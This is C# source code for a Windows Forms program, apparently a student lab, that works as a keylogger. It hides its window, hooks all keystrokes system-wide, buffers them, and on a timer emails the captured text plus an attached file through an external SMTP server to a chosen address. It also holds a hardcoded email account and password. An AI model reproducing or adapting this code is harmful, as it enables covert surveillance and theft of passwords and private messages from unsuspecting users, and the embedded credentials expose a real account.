using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using System.Net.Mime;
using System.Net.Mail;
using System.Timers;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;


namespace Pruebas
{
    public partial class Test : Form
    {
        private int y = 0;
        private int velocity = 5;
        private int x = 0;
        private String correos;
        private Int32 tiempo;
        private MailMessage correoEnviar;
        private String cadena;
        private Attachment Data;
        
        private WQLUtil.Util.Mouse.MouseManager m;

        //INSTRUCCIONES PARA BLOQUEAR LA PANTALLA 
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);


        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        public Test()
        {
            InitializeComponent();
            var handle = GetConsoleWindow();
            //OCULTA LA PANTALLA NEGRA CUANDO INICIA
            ShowWindow(handle, SW_HIDE);

            m = new WQLUtil.Util.Mouse.MouseManager();
                 
            m.Hook.KeyDown += new KeyEventHandler(ExtKeyDown);
            m.Hook.KeyPress += new KeyPressEventHandler(ExtKeyPress);
            m.Hook.KeyUp += new KeyEventHandler(ExtKeyUp);
        }

        private void Log(string txt)
        {
            Console.WriteLine("{0}", txt);
        }
              
        public void ExtKeyDown(object sender, KeyEventArgs e)
        {
            Log(e.KeyData.ToString());
            //LA TECLA F11 BLOQUEA LA VENTANA
            if (e.KeyValue == 122)
            {
                Hide();
            }
            //LA TECLA F12 MUESTRA LA VENTANA
            else if (e.KeyValue == 123)
            {
                Show();
            }            
            Console.WriteLine("x={0}, y={1}, Key = {2}", x, y, e.KeyValue);
           
        }

        public void ExtKeyPress(object sender, KeyPressEventArgs e)
        {
            Log("" + e.KeyChar);
        }

        public void ExtKeyUp(object sender, KeyEventArgs e)
        {
            //ESPACIO SALTO DE LINEA
            if (e.KeyValue == 32 || e.KeyValue == 10 || e.KeyValue == 13)
            {
                cadena = cadena + "\n";
            }
            else if (e.KeyValue == 96 || e.KeyValue == 239 || e.KeyValue == 160 || e.KeyValue == 162)
            {
                cadena = cadena + null;
            }
            else
            {
                cadena = cadena + e.KeyData;
            }

            Log(e.KeyData.ToString());
        }

        public void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            
        }

        private void generarCorreo()
        {

            if (!(textBox2.Text.Trim() == "") && (cadena != null))
            {
                correos = textBox2.Text;
                correoEnviar = new MailMessage();
                correoEnviar.To.Add(new MailAddress(this.correos));
                correoEnviar.From = new MailAddress("cynan_2010@hotmail.com");
                correoEnviar.Subject = "Generando Correo";
                correoEnviar.Body = cadena;
                correoEnviar.IsBodyHtml = false;
                Data = new Attachment("C:/Users/Hernandez/Desktop/Lab5 - RemoteManager/prueba.txt");
                correoEnviar.Attachments.Add(Data);
                SmtpClient smtp = new SmtpClient("smtp.live.com", 587);

                using (smtp)
                {
                    smtp.Credentials = new System.Net.NetworkCredential("cynan_2010@hotmail.com", "Prueba_23");
                    smtp.EnableSsl = true;
                    smtp.Send(correoEnviar);
                    cadena = null;
                }
            }
        }

        private void hilo()
        {
            Thread hilo = new Thread(new ThreadStart(generarCorreo));
            hilo.Priority = ThreadPriority.Lowest;
            hilo.Start();
        }


        private void textBox1_TextChanged(object sender, EventArgs e)
        {
           
        }

        public void timer()
        {
            
            System.Timers.Timer timer = new System.Timers.Timer(tiempo * 60000);
            hilo();
            timer.Start();
        }


        private void Test_Load(object sender, EventArgs e)
        {

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        //Botón que envia los mensajes cuando le da clic
        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                Hide();
                // timer();
                int enviandoctiempo = Int32.Parse(textBox1.Text);
                enviandoctiempo = enviandoctiempo * 60000;
                timer1.Interval = enviandoctiempo;
                timer1.Enabled = true;
                timer1.Start();
            }
            catch
            {

            }

        }


        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox1.Text = String.Empty;
            textBox2.Text = String.Empty;
            timer1.Stop();
        }
        
        private void timer1_Tick(object sender, EventArgs e)
        {
            hilo();
        }

    }
}
